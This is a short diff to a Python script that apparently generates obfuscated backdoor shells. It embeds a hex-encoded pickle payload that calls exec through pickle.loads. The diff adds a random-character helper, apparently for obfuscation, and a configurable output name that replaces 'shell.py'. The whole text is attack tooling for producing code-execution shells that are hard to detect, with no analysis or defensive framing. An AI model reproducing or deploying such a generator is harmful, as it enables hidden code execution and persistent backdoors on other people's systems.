@@ -1,4 +1,20 @@
 import os
+import random
+
+def getRandomStr():
+    chars = '霖阿什顿操大撒德哈卡我被哈韩牛按客户都是嗷对啊空间很聪安徽的abcdefghigklmnopqrstu';
+    charLen = len(chars)
+    pwd = ''
+    resultLen = random.randint(5, 9)
+    while len(pwd) < resultLen:
+        pwd += chars[random.randint(0,charLen-1)]
+    return pwd
+
+x=open("fliename.txt")
+e=x.readlines()
+x.close()
+shellname=e[0]
+
 f=open("hex.txt")
 a=f.readlines()
 f.close()
@@ -50,6 +66,6 @@ code1="8003636275696{0}74696{2}730{1}657865630{1}7100582300000028657865632862617
 a1=bytes.fromhex(code1)
 pickle.loads(a1)
 """
-w=open('shell.py','w+')
+w=open('{0}.py'.format(shellname),'w+')
 w.write(neiro)
 w.close()
